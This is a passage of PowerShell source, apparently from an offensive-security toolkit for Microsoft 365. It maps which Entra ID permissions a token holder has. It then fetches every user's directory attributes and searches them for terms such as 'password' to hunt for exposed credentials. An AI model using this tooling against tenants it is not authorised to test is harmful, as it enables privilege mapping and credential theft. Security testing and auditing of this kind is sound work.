                "microsoft.directory/users/ownedDevices/read" = "Read owned devices of users"
                "microsoft.directory/users/ownedObjects/read" = "Read owned objects of users"
                "microsoft.directory/users/photo/read" = "Read photo of users"
                "microsoft.directory/users/registeredDevices/read" = "Read registered devices of users"
                "microsoft.directory/users/scopedRoleMemberOf/read" = "Read user's membership of a Microsoft Entra role, that is scoped to an administrative unit"
                "microsoft.directory/users/sponsors/read" = "Read sponsors of users"
                "microsoft.directory/authorizationPolicy/allProperties/allTasks" = "Manage all aspects of authorization policy"
                "microsoft.directory/users/inviteGuest" = "Invite Guest Users"
                "microsoft.directory/deletedItems.devices/delete" = "Permanently delete devices, which can no longer be restored"
                "microsoft.directory/deletedItems.devices/restore" = "Restore soft deleted devices to the original state"
                "microsoft.directory/devices/create" = "Create devices (enroll in Microsoft Entra ID)"
                "microsoft.directory/devices/delete" = "Delete devices from Microsoft Entra ID"
                "microsoft.directory/devices/disable" = "Disable devices in Microsoft Entra ID"
                "microsoft.directory/devices/enable" = "Enable devices in Microsoft Entra ID"
                "microsoft.directory/devices/basic/update" = "Update basic properties on devices"
                "microsoft.directory/devices/extensionAttributeSet1/update" = "Update the extensionAttribute1 to extensionAttribute5 properties on devices"
                "microsoft.directory/devices/extensionAttributeSet2/update" = "Update the extensionAttribute6 to extensionAttribute10 properties on devices"
                "microsoft.directory/devices/extensionAttributeSet3/update" = "Update the extensionAttribute11 to extensionAttribute15 properties on devices"
                "microsoft.directory/devices/registeredOwners/update" = "Update registered owners of devices"
                "microsoft.directory/devices/registeredUsers/update" = "Update registered users of devices"
                "microsoft.directory/groups.security/create" = "Create Security groups, excluding role-assignable groups"
                "microsoft.directory/groups.security/delete" = "Delete Security groups, excluding role-assignable groups"
                "microsoft.directory/groups.security/basic/update" = "Update basic properties on Security groups, excluding role-assignable groups"
                "microsoft.directory/groups.security/classification/update" = "Update the classification property on Security groups, excluding role-assignable groups"
                "microsoft.directory/groups.security/dynamicMembershipRule/update" = "Update the dynamic membership rule on Security groups, excluding role-assignable groups"
                "microsoft.directory/groups.security/members/update" = "Update members of Security groups, excluding role-assignable groups"
                "microsoft.directory/groups.security/owners/update" = "Update owners of Security groups, excluding role-assignable groups"
                "microsoft.directory/groups.security/visibility/update" = "Update the visibility property on Security groups, excluding role-assignable groups"
                "microsoft.directory/deviceManagementPolicies/standard/read" = "Read standard properties on device management application policies"
                "microsoft.directory/deviceRegistrationPolicy/standard/read" = "Read standard properties on device registration policies"
                "microsoft.cloudPC/allEntities/allProperties/allTasks" = "Manage all aspects of Windows 365"
                "microsoft.office365.usageReports/allEntities/allProperties/read" = "Read Office 365 usage reports"
                "microsoft.directory/authorizationPolicy/standard/read" = "Read standard properties of authorization policy"
                "microsoft.directory/hybridAuthenticationPolicy/allProperties/allTasks" = "Manage hybrid authentication policy in Microsoft Entra ID"
                "microsoft.directory/organization/dirSync/update" = "Update the organization directory sync property"
                "microsoft.directory/passwordHashSync/allProperties/allTasks" = "Manage all aspects of Password Hash Synchronization (PHS) in Microsoft Entra ID"
                "microsoft.directory/policies/create" = "Create policies in Microsoft Entra ID"
                "microsoft.directory/policies/delete" = "Delete policies in Microsoft Entra ID"
                "microsoft.directory/policies/standard/read" = "Read basic properties on policies"
                "microsoft.directory/policies/owners/read" = "Read owners of policies"
                "microsoft.directory/policies/policyAppliedTo/read" = "Read policies.policyAppliedTo property"
                "microsoft.directory/policies/basic/update" = "Update basic properties on policies"
                "microsoft.directory/policies/owners/update" = "Update owners of policies"
                "microsoft.directory/policies/tenantDefault/update" = "Update default organization policies"
                "microsoft.directory/contacts/create" = "Create contacts"
                "microsoft.directory/groups/assignLicense" = "Assign product licenses to groups for group-based licensing"
                "microsoft.directory/groups/create" = "Create Security groups and Microsoft 365 groups, excluding role-assignable groups"
                "microsoft.directory/groups/reprocessLicenseAssignment" = "Reprocess license assignments for group-based licensing"
                "microsoft.directory/groups/basic/update" = "Update basic properties on Security groups and Microsoft 365 groups, excluding role-assignable groups"
                "microsoft.directory/groups/classification/update" = "Update the classification property on Security groups and Microsoft 365 groups, excluding role-assignable groups"
                "microsoft.directory/groups/dynamicMembershipRule/update" = "Update the dynamic membership rule on Security groups and Microsoft 365 groups, excluding role-assignable groups"
                "microsoft.directory/groups/groupType/update" = "Update properties that would affect the group type of Security groups and Microsoft 365 groups, excluding role-assignable groups"
                "microsoft.directory/groups/members/update" = "Update members of Security groups and Microsoft 365 groups, excluding role-assignable groups"
                "microsoft.directory/groups/onPremWriteBack/update" = "Update Microsoft Entra groups to be written back to on-premises with Microsoft Entra Connect"
                "microsoft.directory/groups/owners/update" = "Update owners of Security groups and Microsoft 365 groups, excluding role-assignable groups"
                "microsoft.directory/groups/settings/update" = "Update settings of groups"
                "microsoft.directory/groups/visibility/update" = "Update the visibility property of Security groups and Microsoft 365 groups, excluding role-assignable groups"
                "microsoft.directory/groupSettings/create" = "Create group settings"
                "microsoft.directory/groupSettings/delete" = "Delete group settings"
                "microsoft.directory/groupSettings/basic/update" = "Update basic properties on group settings"
                "microsoft.directory/oAuth2PermissionGrants/create" = "Create OAuth 2.0 permission grants"
                "microsoft.directory/oAuth2PermissionGrants/basic/update" = "Update OAuth 2.0 permission grants"
                "microsoft.directory/users/assignLicense" = "Manage user licenses"
                "microsoft.directory/users/create" = "Add users"
                "microsoft.directory/users/disable" = "Disable users"
                "microsoft.directory/users/enable" = "Enable users"
                "microsoft.directory/users/invalidateAllRefreshTokens" = "Force sign-out by invalidating user refresh tokens"
                "microsoft.directory/users/reprocessLicenseAssignment" = "Reprocess license assignments for users"
                "microsoft.directory/users/basic/update" = "Update basic properties on users"
                "microsoft.directory/users/manager/update" = "Update manager for users"
                "microsoft.directory/users/photo/update" = "Update photo of users"
                "microsoft.directory/users/sponsors/update" = "Update sponsors of users"
                "microsoft.directory/users/userPrincipalName/update" = "Update User Principal Name of users"
                "microsoft.directory/domains/allProperties/allTasks" = "Create and delete domains, and read and update all properties"
                "microsoft.directory/b2cUserFlow/allProperties/allTasks" = "Read and configure user flow in Azure Active Directory B2C"
                "microsoft.directory/b2cUserAttribute/allProperties/allTasks" = "Read and configure user attribute in Azure Active Directory B2C"
                "microsoft.directory/groups/hiddenMembers/read" = "Read hidden members of Security groups and Microsoft 365 groups, including role-assignable groups"
                "microsoft.directory/groups.unified/create" = "Create Microsoft 365 groups, excluding role-assignable groups"
                "microsoft.directory/groups.unified/delete" = "Delete Microsoft 365 groups, excluding role-assignable groups"
                "microsoft.directory/groups.unified/restore" = "Restore Microsoft 365 groups from soft-deleted container, excluding role-assignable groups"
                "microsoft.directory/groups.unified/basic/update" = "Update basic properties on Microsoft 365 groups, excluding role-assignable groups"
                "microsoft.directory/groups.unified/members/update" = "Update members of Microsoft 365 groups, excluding role-assignable groups"
                "microsoft.directory/groups.unified/owners/update" = "Update owners of Microsoft 365 groups, excluding role-assignable groups"
                "microsoft.office365.exchange/allEntities/basic/allTasks" = "Manage all aspects of Exchange Online"
                "microsoft.office365.network/performance/allProperties/read" = "Read all network performance properties in the Microsoft 365 admin center"
                "microsoft.directory/accessReviews/allProperties/allTasks" = "(Deprecated) Create and delete access reviews, read and update all properties of access reviews, and manage access reviews of groups in Microsoft Entra ID"
                "microsoft.directory/accessReviews/definitions/allProperties/allTasks" = "Manage access reviews of all reviewable resources in Microsoft Entra ID"
                "microsoft.directory/administrativeUnits/allProperties/allTasks" = "Create and manage administrative units (including members)"
                "microsoft.directory/applications/allProperties/allTasks" = "Create and delete applications, and read and update all properties"
                "microsoft.directory/users/authenticationMethods/create" = "Update authentication methods for users"
                "microsoft.directory/users/authenticationMethods/delete" = "Delete authentication methods for users"
                "microsoft.directory/users/authenticationMethods/standard/read" = "Read standard properties of authentication methods for users"
                "microsoft.directory/users/authenticationMethods/basic/update" = "Update basic properties of authentication methods for users"
                "microsoft.directory/bitlockerKeys/key/read" = "Read bitlocker metadata and key on devices"
                "microsoft.directory/cloudAppSecurity/allProperties/allTasks" = "Create and delete all resources, and read and update standard properties in Microsoft Defender for Cloud Apps"
                "microsoft.directory/contacts/allProperties/allTasks" = "Create and delete contacts, and read and update all properties"
                "microsoft.directory/contracts/allProperties/allTasks" = "Create and delete partner contracts, and read and update all properties"
                "microsoft.directory/deletedItems/delete" = "Permanently delete objects, which can no longer be restored"
                "microsoft.directory/deletedItems/restore" = "Restore soft deleted objects to original state"
                "microsoft.directory/devices/allProperties/allTasks" = "Create and delete devices, and read and update all properties"
                "microsoft.directory/namedLocations/create" = "Create custom rules that define network locations"
                "microsoft.directory/namedLocations/delete" = "Delete custom rules that define network locations"
                "microsoft.directory/namedLocations/standard/read" = "Read basic properties of custom rules that define network locations"
                "microsoft.directory/namedLocations/basic/update" = "Update basic properties of custom rules that define network locations"
                "microsoft.directory/deviceLocalCredentials/password/read" = "Read all properties of the backed up local administrator account credentials for Microsoft Entra joined devices, including the password"
                "microsoft.directory/deviceManagementPolicies/basic/update" = "Update basic properties on device management application policies"
                "microsoft.directory/deviceRegistrationPolicy/basic/update" = "Update basic properties on device registration policies"
                "microsoft.directory/directoryRoles/allProperties/allTasks" = "Create and delete directory roles, and read and update all properties"
                "microsoft.directory/directoryRoleTemplates/allProperties/allTasks" = "Create and delete Microsoft Entra role templates, and read and update all properties"
                "microsoft.directory/domains/federationConfiguration/standard/read" = "Read standard properties of federation configuration for domains"
                "microsoft.directory/domains/federationConfiguration/basic/update" = "Update basic federation configuration for domains"
                "microsoft.directory/domains/federationConfiguration/create" = "Create federation configuration for domains"
                "microsoft.directory/domains/federationConfiguration/delete" = "Delete federation configuration for domains"
                "microsoft.directory/entitlementManagement/allProperties/allTasks" = "Create and delete resources, and read and update all properties in Microsoft Entra entitlement management"
                "microsoft.directory/groups/allProperties/allTasks" = "Create and delete groups, and read and update all properties"
                "microsoft.directory/groupsAssignableToRoles/create" = "Create role-assignable groups"
                "microsoft.directory/groupsAssignableToRoles/delete" = "Delete role-assignable groups"
                "microsoft.directory/groupsAssignableToRoles/restore" = "Restore role-assignable groups"
                "microsoft.directory/groupsAssignableToRoles/allProperties/update" = "Update role-assignable groups"
                "microsoft.directory/groupSettings/allProperties/allTasks" = "Create and delete group settings, and read and update all properties"
                "microsoft.directory/groupSettingTemplates/allProperties/allTasks" = "Create and delete group setting templates, and read and update all properties"
                "microsoft.directory/identityProtection/allProperties/allTasks" = "Create and delete all resources, and read and update standard properties in Microsoft Entra ID Protection"
                "microsoft.directory/loginOrganizationBranding/allProperties/allTasks" = "Create and delete loginTenantBranding, and read and update all properties"
                "microsoft.directory/organization/allProperties/allTasks" = "Read and update all properties for an organization"
                "microsoft.directory/policies/allProperties/allTasks" = "Create and delete policies, and read and update all properties"
                "microsoft.directory/conditionalAccessPolicies/allProperties/allTasks" = "Manage all properties of conditional access policies"
                "microsoft.directory/crossTenantAccessPolicy/standard/read" = "Read basic properties of cross-tenant access policy"
                "microsoft.directory/crossTenantAccessPolicy/allowedCloudEndpoints/update" = "Update allowed cloud endpoints of cross-tenant access policy"
                "microsoft.directory/crossTenantAccessPolicy/basic/update" = "Update basic settings of cross-tenant access policy"
                "microsoft.directory/crossTenantAccessPolicy/default/standard/read" = "Read basic properties of the default cross-tenant access policy"
                "microsoft.directory/crossTenantAccessPolicy/default/b2bCollaboration/update" = "Update Microsoft Entra B2B collaboration settings of the default cross-tenant access policy"
                "microsoft.directory/crossTenantAccessPolicy/default/b2bDirectConnect/update" = "Update Microsoft Entra B2B direct connect settings of the default cross-tenant access policy"
                "microsoft.directory/crossTenantAccessPolicy/default/crossCloudMeetings/update" = "Update cross-cloud Teams meeting settings of the default cross-tenant access policy"
                "microsoft.directory/crossTenantAccessPolicy/default/tenantRestrictions/update" = "Update tenant restrictions of the default cross-tenant access policy"
                "microsoft.directory/crossTenantAccessPolicy/partners/create" = "Create cross-tenant access policy for partners"
                "microsoft.directory/crossTenantAccessPolicy/partners/delete" = "Delete cross-tenant access policy for partners"
                "microsoft.directory/crossTenantAccessPolicy/partners/standard/read" = "Read basic properties of cross-tenant access policy for partners"
                "microsoft.directory/crossTenantAccessPolicy/partners/b2bCollaboration/update" = "Update Microsoft Entra B2B collaboration settings of cross-tenant access policy for partners"
                "microsoft.directory/crossTenantAccessPolicy/partners/b2bDirectConnect/update" = "Update Microsoft Entra B2B direct connect settings of cross-tenant access policy for partners"
                "microsoft.directory/crossTenantAccessPolicy/partners/crossCloudMeetings/update" = "Update cross-cloud Teams meeting settings of cross-tenant access policy for partners"
                "microsoft.directory/crossTenantAccessPolicy/partners/tenantRestrictions/update" = "Update tenant restrictions of cross-tenant access policy for partners"
                "microsoft.directory/crossTenantAccessPolicy/partners/identitySynchronization/create" = "Create cross-tenant sync policy for partners"
                "microsoft.directory/crossTenantAccessPolicy/partners/identitySynchronization/basic/update" = "Update basic settings of cross-tenant sync policy"
                "microsoft.directory/crossTenantAccessPolicy/partners/identitySynchronization/standard/read" = "Read basic properties of cross-tenant sync policy"
                "microsoft.directory/privilegedIdentityManagement/allProperties/read" = "Read all resources in Privileged Identity Management"
                "microsoft.directory/resourceNamespaces/resourceActions/authenticationContext/update" = "Update Conditional Access authentication context of Microsoft 365 role-based access control (RBAC) resource actions"
                "microsoft.directory/roleAssignments/allProperties/allTasks" = "Create and delete role assignments, and read and update all role assignment properties"
                "microsoft.directory/roleDefinitions/allProperties/allTasks" = "Create and delete role definitions, and read and update all properties"
                "microsoft.directory/scopedRoleMemberships/allProperties/allTasks" = "Create and delete scopedRoleMemberships, and read and update all properties"
                "microsoft.directory/serviceAction/activateService" = "Can perform the 'activate service' action for a service"
                "microsoft.directory/serviceAction/disableDirectoryFeature" = "Can perform the 'disable directory feature' service action"
                "microsoft.directory/serviceAction/enableDirectoryFeature" = "Can perform the 'enable directory feature' service action"
                "microsoft.directory/serviceAction/getAvailableExtentionProperties" = "Can perform the getAvailableExtentionProperties service action"
                "microsoft.directory/servicePrincipals/allProperties/allTasks" = "Create and delete service principals, and read and update all properties"
                "microsoft.directory/servicePrincipals/managePermissionGrantsForAll.microsoft-company-admin" = "Grant consent for any permission to any application"
                "microsoft.directory/subscribedSkus/allProperties/allTasks" = "Buy and manage subscriptions and delete subscriptions"
                "microsoft.directory/users/allProperties/allTasks" = "Create and delete users, and read and update all properties"
                "microsoft.directory/permissionGrantPolicies/create" = "Create permission grant policies"
                "microsoft.directory/permissionGrantPolicies/delete" = "Delete permission grant policies"
                "microsoft.directory/permissionGrantPolicies/standard/read" = "Read standard properties of permission grant policies"
                "microsoft.directory/permissionGrantPolicies/basic/update" = "Update basic properties of permission grant policies"
                "microsoft.directory/servicePrincipalCreationPolicies/create" = "Create service principal creation policies"
                "microsoft.directory/servicePrincipalCreationPolicies/delete" = "Delete service principal creation policies"
                "microsoft.directory/servicePrincipalCreationPolicies/standard/read" = "Read standard properties of service principal creation policies"
                "microsoft.directory/servicePrincipalCreationPolicies/basic/update" = "Update basic properties of service principal creation policies"
                "microsoft.directory/tenantManagement/tenants/create" = "Create new tenants in Microsoft Entra ID"
                "microsoft.directory/verifiableCredentials/configuration/contracts/cards/allProperties/read" = "Read a verifiable credential card"
                "microsoft.directory/verifiableCredentials/configuration/contracts/cards/revoke" = "Revoke a verifiable credential card"
                "microsoft.directory/verifiableCredentials/configuration/contracts/create" = "Create a verifiable credential contract"
                "microsoft.directory/verifiableCredentials/configuration/contracts/allProperties/read" = "Read a verifiable credential contract"
                "microsoft.directory/verifiableCredentials/configuration/contracts/allProperties/update" = "Update a verifiable credential contract"
                "microsoft.directory/verifiableCredentials/configuration/create" = "Create configuration required to create and manage verifiable credentials"
                "microsoft.directory/verifiableCredentials/configuration/delete" = "Delete configuration required to create and manage verifiable credentials and delete all of its verifiable credentials"
                "microsoft.directory/verifiableCredentials/configuration/allProperties/read" = "Read configuration required to create and manage verifiable credentials"
                "microsoft.directory/verifiableCredentials/configuration/allProperties/update" = "Update configuration required to create and manage verifiable credentials"
                "microsoft.directory/lifecycleWorkflows/workflows/allProperties/allTasks" = "Manage all aspects of lifecycle workflows and tasks in Microsoft Entra ID"
                "microsoft.directory/pendingExternalUserProfiles/create" = "Create external user profiles in the extended directory for Teams"
                "microsoft.directory/pendingExternalUserProfiles/standard/read" = "Read standard properties of external user profiles in the extended directory for Teams"
                "microsoft.directory/pendingExternalUserProfiles/basic/update" = "Update basic properties of external user profiles in the extended directory for Teams"
                "microsoft.directory/pendingExternalUserProfiles/delete" = "Delete external user profiles in the extended directory for Teams"
                "microsoft.directory/externalUserProfiles/standard/read" = "Read standard properties of external user profiles in the extended directory for Teams"
                "microsoft.directory/externalUserProfiles/basic/update" = "Update basic properties of external user profiles in the extended directory for Teams"
                "microsoft.directory/externalUserProfiles/delete" = "Delete external user profiles in the extended directory for Teams"
                "microsoft.azure.advancedThreatProtection/allEntities/allTasks" = "Manage all aspects of Azure Advanced Threat Protection"
                "microsoft.azure.informationProtection/allEntities/allTasks" = "Manage all aspects of Azure Information Protection"
                "microsoft.commerce.billing/allEntities/allProperties/allTasks" = "Manage all aspects of Office 365 billing"
                "microsoft.commerce.billing/purchases/standard/read" = "Read purchase services in M365 Admin Center."
                "microsoft.dynamics365/allEntities/allTasks" = "Manage all aspects of Dynamics 365"
                "microsoft.edge/allEntities/allProperties/allTasks" = "Manage all aspects of Microsoft Edge"
                "microsoft.networkAccess/allEntities/allProperties/allTasks" = "Manage all aspects of Entra Network Access"
                "microsoft.flow/allEntities/allTasks" = "Manage all aspects of Microsoft Power Automate"
                "microsoft.hardware.support/shippingAddress/allProperties/allTasks" = "Create, read, update, and delete shipping addresses for Microsoft hardware warranty claims, including shipping addresses created by others"
                "microsoft.hardware.support/shippingStatus/allProperties/read" = "Read shipping status for open Microsoft hardware warranty claims"
                "microsoft.hardware.support/warrantyClaims/allProperties/allTasks" = "Create and manage all aspects of Microsoft hardware warranty claims"
                "microsoft.insights/allEntities/allProperties/allTasks" = "Manage all aspects of Insights app"
                "microsoft.intune/allEntities/allTasks" = "Manage all aspects of Microsoft Intune"
                "microsoft.office365.complianceManager/allEntities/allTasks" = "Manage all aspects of Office 365 Compliance Manager"
                "microsoft.office365.desktopAnalytics/allEntities/allTasks" = "Manage all aspects of Desktop Analytics"
                "microsoft.office365.knowledge/contentUnderstanding/allProperties/allTasks" = "Read and update all properties of content understanding in Microsoft 365 admin center"
                "microsoft.office365.knowledge/contentUnderstanding/analytics/allProperties/read" = "Read analytics reports of content understanding in Microsoft 365 admin center"
                "microsoft.office365.knowledge/knowledgeNetwork/allProperties/allTasks" = "Read and update all properties of knowledge network in Microsoft 365 admin center"
                "microsoft.office365.knowledge/knowledgeNetwork/topicVisibility/allProperties/allTasks" = "Manage topic visibility of knowledge network in Microsoft 365 admin center"
                "microsoft.office365.knowledge/learningSources/allProperties/allTasks" = "Manage learning sources and all their properties in Learning App."
                "microsoft.office365.lockbox/allEntities/allTasks" = "Manage all aspects of Customer Lockbox"
                "microsoft.office365.messageCenter/messages/read" = "Read messages in Message Center in the Microsoft 365 admin center, excluding security messages"
                "microsoft.office365.messageCenter/securityMessages/read" = "Read security messages in Message Center in the Microsoft 365 admin center"
                "microsoft.office365.organizationalMessages/allEntities/allProperties/allTasks" = "Manage all authoring aspects of Microsoft 365 admin center communications"
                "microsoft.office365.organizationalMessages/templates/allProperties/allTasks" = "Manage all authoring aspects of Microsoft 365 admin center communications templates"
                "microsoft.office365.organizationalMessages/allEntities/allTasks" = "Manage all aspects of Microsoft 365 admin center communications"
                "microsoft.office365.organizationalMessages/templates/allTasks" = "Manage all aspects of Microsoft 365 admin center communications templates"
                "microsoft.office365.powerPlatform/allEntities/allTasks" = "Manage all aspects of Power Platform"
                "microsoft.office365.securityComplianceCenter/allEntities/allProperties/allTasks" = "Manage all aspects of Office 365 Security & Compliance Center"
                "microsoft.directory/accessReviews/allProperties/read" = "(Deprecated) Read all properties of access reviews"
                "microsoft.directory/accessReviews/definitions/allProperties/read" = "Read all properties of access reviews of all reviewable resources in Microsoft Entra ID"
                "microsoft.directory/adminConsentRequestPolicy/allProperties/read" = "Read all properties of admin consent request policies in Microsoft Entra ID"
                "microsoft.directory/administrativeUnits/allProperties/read" = "Read all properties of administrative units, including members"
                "microsoft.directory/applications/allProperties/read" = "Read all properties (including privileged properties) on all types of applications"
                "microsoft.directory/users/authenticationMethods/standard/restrictedRead" = "Read standard properties of authentication methods that do not include personally identifiable information for users"
                "microsoft.directory/cloudAppSecurity/allProperties/read" = "Read all properties for Defender for Cloud Apps"
                "microsoft.directory/contacts/allProperties/read" = "Read all properties for contacts"
                "microsoft.directory/customAuthenticationExtensions/allProperties/read" = "Read custom authentication extensions"
                "microsoft.directory/deviceLocalCredentials/standard/read" = "Read all properties of the backed up local administrator account credentials for Microsoft Entra joined devices, except the password"
                "microsoft.directory/devices/allProperties/read" = "Read all properties of devices"
                "microsoft.directory/directoryRoles/allProperties/read" = "Read all properties of directory roles"
                "microsoft.directory/directoryRoleTemplates/allProperties/read" = "Read all properties of directory role templates"
                "microsoft.directory/domains/allProperties/read" = "Read all properties of domains"
                "microsoft.directory/entitlementManagement/allProperties/read" = "Read all properties in Microsoft Entra entitlement management"
                "microsoft.directory/groups/allProperties/read" = "Read all properties (including privileged properties) on Security groups and Microsoft 365 groups, including role-assignable groups"
                "microsoft.directory/groupSettings/allProperties/read" = "Read all properties of group settings"
                "microsoft.directory/groupSettingTemplates/allProperties/read" = "Read all properties of group setting templates"
                "microsoft.directory/identityProtection/allProperties/read" = "Read all resources in Microsoft Entra ID Protection"
                "microsoft.directory/loginOrganizationBranding/allProperties/read" = "Read all properties for your organization's branded sign-in page"
                "microsoft.directory/oAuth2PermissionGrants/allProperties/read" = "Read all properties of OAuth 2.0 permission grants"
                "microsoft.directory/organization/allProperties/read" = "Read all properties for an organization"
                "microsoft.directory/policies/allProperties/read" = "Read all properties of policies"
                "microsoft.directory/conditionalAccessPolicies/allProperties/read" = "Read all properties of conditional access policies"
                "microsoft.directory/roleAssignments/allProperties/read" = "Read all properties of role assignments"
                "microsoft.directory/roleDefinitions/allProperties/read" = "Read all properties of role definitions"
                "microsoft.directory/scopedRoleMemberships/allProperties/read" = "View members in administrative units"
                "microsoft.directory/servicePrincipals/allProperties/read" = "Read all properties (including privileged properties) on servicePrincipals"
                "microsoft.directory/subscribedSkus/allProperties/read" = "Read all properties of product subscriptions"
                "microsoft.directory/users/allProperties/read" = "Read all properties of users"
                "microsoft.directory/lifecycleWorkflows/workflows/allProperties/read" = "Read all properties of lifecycle workflows and tasks in Microsoft Entra ID"
                "microsoft.cloudPC/allEntities/allProperties/read" = "Read all aspects of Windows 365"
                "microsoft.commerce.billing/allEntities/allProperties/read" = "Read all resources of Office 365 billing"
                "microsoft.edge/allEntities/allProperties/read" = "Read all aspects of Microsoft Edge"
                "microsoft.networkAccess/allEntities/allProperties/read" = "Read all aspects of Entra Network Access"
                "microsoft.hardware.support/shippingAddress/allProperties/read" = "Read shipping addresses for Microsoft hardware warranty claims, including existing shipping addresses created by others"
                "microsoft.hardware.support/warrantyClaims/allProperties/read" = "Read Microsoft hardware warranty claims"
                "microsoft.insights/allEntities/allProperties/read" = "Read all aspects of Viva Insights"
                "microsoft.office365.organizationalMessages/allEntities/allProperties/read" = "Read all aspects of Microsoft 365 Organizational Messages"
                "microsoft.office365.protectionCenter/allEntities/allProperties/read" = "Read all properties in the Security and Compliance centers"
                "microsoft.office365.securityComplianceCenter/allEntities/read" = "Read standard properties in Microsoft 365 Security and Compliance Center"
                "microsoft.office365.yammer/allEntities/allProperties/read" = "Read all aspects of Yammer"
                "microsoft.permissionsManagement/allEntities/allProperties/read" = "Read all aspects of Entra Permissions Management"
                "microsoft.teams/allEntities/allProperties/read" = "Read all properties of Microsoft Teams"
                "microsoft.virtualVisits/allEntities/allProperties/read" = "Read all aspects of Virtual Visits"
                "microsoft.viva.goals/allEntities/allProperties/read" = "Read all aspects of Microsoft Viva Goals"
                "microsoft.viva.pulse/allEntities/allProperties/read" = "Read all aspects of Microsoft Viva Pulse"
                "microsoft.windows.updatesDeployments/allEntities/allProperties/read" = "Read all aspects of Windows Update Service"
            }

            # Split resource actions into batches of 20
            $batchSize = 20
            $batchCount = [math]::Ceiling($resourceActions.Count / $batchSize)

            # Create arrays to separate "Allowed" and other access types
            $allowedActions = @()
            $conditionalActions = @()
            $otherActions = @()
    

            for ($i = 0; $i -lt $batchCount; $i++) {
                $start = $i * $batchSize
                $end = [Math]::Min(($i + 1) * $batchSize, $resourceActions.Count)

                $batchResourceActions = $resourceActions.GetEnumerator() | Select-Object -Skip $start -First $batchSize

                $requestBody = @{
                    resourceActionAuthorizationChecks = $batchResourceActions | ForEach-Object {
                        @{
                            directoryScopeId = $userid
                            resourceAction = $_.Key
                        }
                    }
                } | ConvertTo-JSon

                try {
                    $estimateresponse = Invoke-RestMethod -Uri $estimateAccessEndpoint -Headers $headers -Method Post -Body $requestBody

                    foreach ($perm in $estimateresponse.value) {
                        $accessdecision = $perm.accessdecision
                        $resourceAction = $perm.resourceaction

                        # Determine the access type and add to the appropriate array
                        if ($accessdecision -eq "Allowed") {
                            $description = $resourceActions[$resourceAction]
                            $allowedActions += "$description : $accessdecision"
                        } 
                        elseif($accessdecision -eq "Conditional"){
                            $description = $resourceActions[$resourceAction]
                            $conditionalActions += "$description : $accessdecision"
                        }
                        else {
                            $description = $resourceActions[$resourceAction]
                            $otherActions += "$description : $accessdecision"
                        }
                    }
                } catch {
                    Write-Host -ForegroundColor Red "Error estimating access: $_"
                }
            }

            # Output "Allowed" actions first, followed by other actions
            Write-Host -ForegroundColor Green "[Allowed Actions]:"
            
            foreach ($action in $allowedActions) {
                Write-Output $action
            }

            Write-Host -ForegroundColor Yellow "[Conditional Actions]:"
            foreach ($action in $conditionalActions) {
                Write-Output $action
            }
        } catch {
            Write-Host -ForegroundColor Red "Error fetching user information: $_"
        }
    
    }
}

function Invoke-SearchUserAttributes {
    <#
    .SYNOPSIS

    This module will query user attributes from the directory and search through them for a specific term.
    Author: Beau Bullock (@dafthack)
    License: MIT
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module will query user attributes from the directory and search through them for a specific term.

    .PARAMETER Tokens

    Token object for auth

    .PARAMETER SearchTerm

    The term you want to search across user attributes

    .EXAMPLE

    C:\PS> Invoke-SearchUserAttributes -Tokens $tokens -SearchTerm "password"
    -----------
    This will search every user attribute for the term password.

    #>
    Param(

        [Parameter(Position = 0, Mandatory = $False)]
        [object[]]
        $Tokens = "",

        [Parameter(Position = 0, Mandatory = $True)]
        [string]
        $SearchTerm = ""
    )

    if ($Tokens) {
        Write-Host -ForegroundColor yellow "[*] Using the provided access tokens."
    } else {
        # Login
        Write-Host -ForegroundColor yellow "[*] First, you need to login." 
        Write-Host -ForegroundColor yellow "[*] If you already have tokens you can use the -Tokens parameter to pass them to this function."
        while ($auth -notlike "Yes") {
            Write-Host -ForegroundColor cyan "[*] Do you want to authenticate now (yes/no)?"
            $answer = Read-Host 
            $answer = $answer.ToLower()
            if ($answer -eq "yes" -or $answer -eq "y") {
                Write-Host -ForegroundColor yellow "[*] Running Get-GraphTokens now..."
                $tokens = Get-GraphTokens -ExternalCall
                $auth = "Yes"
            } elseif ($answer -eq "no" -or $answer -eq "n") {
                Write-Host -ForegroundColor Yellow "[*] Quitting..."
                return
            } else {
                Write-Host -ForegroundColor red "Invalid input. Please enter Yes or No."
            }
        }
    }
    $accesstoken = $tokens.access_token   
    [string]$refreshToken = $tokens.refresh_token 

    $headers = @{
        Authorization = "Bearer $accessToken"
    }

    $usersEndpoint = "https://graph.microsoft.com/v1.0/users"
    $graphApiUrl = "https://graph.microsoft.com/v1.0"
    Write-Host "[*] Now searching each user attribute for the term $searchTerm"
    # Query users
    Write-Host "[*] Gathering the users from the tenant."
    do {
        try {
            $usersResponse = Invoke-RestMethod -Uri $usersEndpoint -Headers $headers
        } catch {
            if ($_.Exception.Response.StatusCode.value__ -eq "429") {
                Write-Host -ForegroundColor red "[*] Being throttled... sleeping 5 seconds"
                Start-Sleep -Seconds 5
                continue
            } else {
                throw $_
            }
        }

        $attributes = '?$select=accountEnabled,ageGroup,assignedLicenses,businessPhones,city,companyName,consentProvidedForMinor,country,createdDateTime,creationType,department,displayName,mail,employeeId,employeeHireDate,employeeOrgData,employeeType,onPremisesExtensionAttributes,externalUserStateChangeDateTime,faxNumber,givenName,imAddresses,identities,externalUserState,jobTitle,surname,lastPasswordChangeDateTime,legalAgeGroupClassification,mailNickname,mobilePhone,id,officeLocation,onPremisesSamAccountName,onPremisesDistinguishedName,onPremisesDomainName,onPremisesImmutableId,onPremisesLastSyncDateTime,onPremisesProvisioningErrors,onPremisesSecurityIdentifier,onPremisesSyncEnabled,onPremisesUserPrincipalName,otherMails,passwordPolicies,passwordProfile,preferredDataLocation,preferredLanguage,proxyAddresses,Comment,Info,Password,Information,Description,login,signin,credential,cred,credentials,data,signInSessionsValidFromDateTime,sponsors,state,streetAddress,usageLocation,userPrincipalName,userType,postalCode&$expand=manager'

        foreach ($user in $usersResponse.value) {
            $userId = $user.id
            $uri = ($graphApiUrl + "/users/" + $userId + $attributes)
            try {
                $userAttributesResponse = Invoke-RestMethod -Uri $uri -Headers $headers
            } catch {
                if ($_.Exception.Response.StatusCode.value__ -eq "429") {
                    Write-Host -ForegroundColor red "[*] Being throttled... sleeping 5 seconds"
                    Start-Sleep -Seconds 5
                    continue
                } else {
                    throw $_
                }
            }

            $upn = $userAttributesResponse.UserPrincipalName
            # Search through attributes (excluding @odata.context)
            $propertiesToSearch = $userAttributesResponse.PSObject.Properties | Where-Object { $_.Name -ne "@odata.context" }
            foreach ($property in $propertiesToSearch) {
                $propertyName = $property.Name
                $propertyValue = $property.Value

